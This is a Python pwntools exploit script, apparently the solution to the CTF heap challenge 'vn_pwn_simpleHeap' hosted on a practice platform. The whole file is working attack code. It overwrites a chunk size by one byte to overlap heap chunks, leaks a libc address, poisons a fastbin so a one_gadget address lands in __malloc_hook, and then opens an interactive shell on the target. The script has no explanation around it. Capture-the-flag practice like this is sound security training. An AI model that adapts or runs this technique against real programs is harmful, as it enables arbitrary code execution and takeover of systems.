#coding:utf-8
import sys
from pwn import *
from FILE import *
context.log_level='debug'
context.arch='amd64'
while True :
	# try :
		if len(sys.argv)==1 :
			io=process('./vn_pwn_simpleHeap')
			# io=process(['./'],env={'LD_PRELOAD':'./'})
			elf=ELF('./vn_pwn_simpleHeap')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			one_gadget=[0x45216,0x4526a,0xf02a4,0xf1147]
		else :
			io=remote('node3.buuoj.cn',29474)
			elf=ELF('./vn_pwn_simpleHeap')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			one_gadget=[0x45216,0x4526a,0xf02a4,0xf1147]

		def add(a,b):
			io.sendlineafter('choice: ','1')
			io.sendlineafter('size?',str(a))
			io.sendafter('content:',b)

		def edit(a,b):
			io.sendlineafter('choice: ','2')
			io.sendlineafter('idx?',str(a))
			io.sendafter('content:',b)

		def show(a):
			io.sendlineafter('choice: ','3')
			io.sendlineafter('idx?',str(a))

		def delete(a):
			io.sendlineafter('choice: ','4')
			io.sendlineafter('idx?',str(a))


		add(0x48,'aaaa')
		add(0x58,'aaaa')
		add(0x68,'aaaa')
		add(0x18,'aaaa')
		add(0x18,'aaaa')
		edit(0,'\x00'*0x40+p64(0x00)+'\xf1')
		delete(1)
		delete(2)
		add(0x48,'\n')
		show(1)
		libc_base=u64(io.recv(6)+'\x00\x00')-libc.sym['__malloc_hook']-0xfa
		libc.address=libc_base
		add(0x58,'\x00'*0x8+p64(0x71)+p64(libc.sym['__malloc_hook']-0x23))
		add(0x68,'aaaa')
		add(0x38,'\x00'*0x38)
		add(0x68,'\x00'*0x13+p64(libc_base+one_gadget[2]))
		delete(3)




		success('libc_base:'+hex(libc_base))
		# gdb.attach(io)
		# pause()
		io.interactive()



	
	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue